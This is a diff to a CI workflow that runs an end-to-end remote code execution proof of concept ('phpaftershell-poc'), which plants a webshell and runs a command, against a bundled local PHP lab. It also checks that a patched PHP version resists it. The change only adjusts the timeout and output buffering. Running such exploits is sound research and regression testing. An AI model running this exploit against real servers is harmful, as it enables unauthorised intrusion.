@@ -21,7 +21,7 @@ jobs:
   e2e:
     name: End-to-end RCE against the bundled lab
     runs-on: ubuntu-latest
-    timeout-minutes: 30
+    timeout-minutes: 45
     steps:
       - uses: actions/checkout@v4
 
@@ -46,12 +46,14 @@ jobs:
         run: python poc/stage2_oom.py
 
       - name: "Remote exploit - 100% HTTP RCE (webshell + command)"
-        # the lab makes the webroot writable itself (compose command)
-        run: ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id' --attempts 40
+        # the lab makes the webroot writable itself (compose command);
+        # -u keeps the attempt feed live in the log even if the run is
+        # cancelled mid-flight
+        run: python3 -u ./phpaftershell-poc --target http://127.0.0.1:8087 --command 'id' --attempts 40
 
       - name: "Control - patched PHP (8.4.28) must not be exploitable"
         # same real interruption path, must exhaust attempts without a hit
-        run: "! ./phpaftershell-poc --target http://127.0.0.1:8088 --command 'id' --attempts 8"
+        run: "! python3 -u ./phpaftershell-poc --target http://127.0.0.1:8088 --command 'id' --attempts 8"
 
       - name: "Control - mitigated target (upload progress off) has no progress record"
         run: |
